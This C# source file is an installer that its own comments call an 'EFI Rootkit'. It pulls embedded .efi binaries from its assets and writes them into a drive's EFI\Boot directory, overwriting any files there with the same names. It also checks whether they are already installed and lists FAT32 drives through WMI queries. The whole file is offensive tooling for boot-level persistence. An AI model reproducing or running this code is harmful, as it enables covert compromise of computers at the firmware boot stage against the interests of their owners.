using NHA_Assets;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Threading.Tasks;

namespace NHADSE{
public static class NDSE_Installer{
        
/// <summary>
/// Get The EFI\\Boot Directory From A Base Path
/// </summary>
/// <param name="BasePathOrDrive"></param>
/// <returns></returns>
public static string GetEFIDirectory(string BasePathOrDrive){
if(BasePathOrDrive.Length==1? BasePathOrDrive!=":": false)
BasePathOrDrive= BasePathOrDrive.ToUpper()+":";
return (BasePathOrDrive.EndsWith("\\") ? BasePathOrDrive : (BasePathOrDrive + "\\")) + "EFI\\Boot";
}

/// <summary>
/// Install The EFI Rootkit To A Directory (Please Read Full Source If Executing This Yourself)
/// </summary>
/// <param name="BasePath"></param>
public static void Install(string BasePath) {
List<(string Name,Stream Stream)> list = new List<(string Name, Stream Stream)>();
Utilitys.Assembly.EnumerateAssets(@"NHADSE\EFI\", (Name,Stream) => {
if(Name.ToLower().EndsWith(".efi"))
list.Add((Name,Stream));
else{
Stream.Close();
Stream.Dispose();
}
});
string DIR= GetEFIDirectory(BasePath);
if(!Directory.Exists(DIR))
Directory.CreateDirectory(DIR);
DIR= DIR+"\\";
FileStream file=null;
foreach(var DB in list) {   
if(File.Exists(DIR+DB.Name))
File.Delete(DIR+DB.Name);
DB.Stream.CopyTo(file = new FileStream(DIR+DB.Name, FileMode.CreateNew)); 
file.Close();       
DB.Stream.Close();
DB.Stream.Dispose();
}

}
public static bool IsInstalled(string BasePath){
string DIR= GetEFIDirectory(BasePath)+"\\";
if(!Directory.Exists(DIR))
return false;
var F=true;
Utilitys.Assembly.EnumerateAssets(@"NHADSE\EFI\", (Name,Stream) => {
if (Name.ToLower().EndsWith(".efi"))
if(!File.Exists(DIR + Name)){
F = false;
return true;
}else if(File.ReadAllBytes(DIR + Name).Length<1337/(1337/20)){
F = false;
return true;
}
Stream.Close();
Stream.Dispose();
return false;
});
return F;
}

public static ManagementBaseObject Get(this ManagementObjectCollection Col,int Index = 0) { 
var D=0;
foreach(var C in Col){
if(D==Index)
return C;
D++;
}
return null;
}

private static (string Model,string PHYSICALDRIVE) GetModelFromDrive(this DriveInfo D){
var Out=("","");
string driveLetter=D.Name.Substring(0, 1);
if (driveLetter.Length == 1) driveLetter+=":";else if (driveLetter.Length != 2) return Out;

var PartitionsSearcher = new ManagementObjectSearcher("ASSOCIATORS OF {Win32_LogicalDisk.DeviceID='" + driveLetter + "'} WHERE ResultClass=Win32_DiskPartition");
var Partitions = PartitionsSearcher.Get();
if (Partitions.Count > 0) { 
var Partition = Partitions.Get();
var DrivesSearcher = new ManagementObjectSearcher("ASSOCIATORS OF {Win32_DiskPartition.DeviceID='" + Partition["DeviceID"] + "'} WHERE ResultClass=Win32_DiskDrive");
var Drives = DrivesSearcher.Get();
if (Drives.Count > 0) { 
var Drive= Drives.Get();
Out= ((string)Drive["Caption"],
((string)Drive["Name"]).Trim('\\').Replace(".\\", ""));
Drive.Dispose();
}
Partition.Dispose();
Drives.Dispose();
DrivesSearcher.Dispose();
}
Partitions.Dispose();
PartitionsSearcher.Dispose();
return Out;
}
   

/// <summary>
/// Get A List Of Compatble EFI Drives (Fastest Possible) Fat32 Only Unless GetAlsoIncompatibleDrives Is True
/// </summary>
/// <returns></returns>
public static async Task<List<DRIVE>> GetCompatibleDrives(bool GetAlsoIncompatibleDrives=false) { 
var DB=new List<DRIVE>();
var PT=Parallel.ForEach(DriveInfo.GetDrives(),new ParallelOptions() { MaxDegreeOfParallelism=15}, Info => { 
dynamic S=null;
if(GetAlsoIncompatibleDrives?true:Info.DriveFormat=="FAT32")
DB.Add(new DRIVE(Info.VolumeLabel,Info.Name, (S = GetModelFromDrive(Info)).Item1, S.Item2, Info.DriveFormat == "FAT32"));
S = null;
});
while(!PT.IsCompleted)
await Task.Delay(1);
return DB;
}

/// <summary>
/// Get The EFI\\Boot Directory
/// </summary>
/// <param name="BasePathOrDrive"></param>
/// <returns></returns>
public static void GetEFIDirectory(this DRIVE BasePathOrDrive) =>
GetEFIDirectory(BasePathOrDrive.DriveLetter);
        
/// <summary>
/// Install The EFI Rootkit To A Directory (Please Read Full Source If Executing This Yourself)
/// </summary>
/// <param name="DRIVE"></param>
public static void Install(this DRIVE DRIVE) => 
Install(DRIVE.DriveLetter);
public static bool IsInstalled(this DRIVE DRIVE) =>
IsInstalled(DRIVE.DriveLetter);
        
}}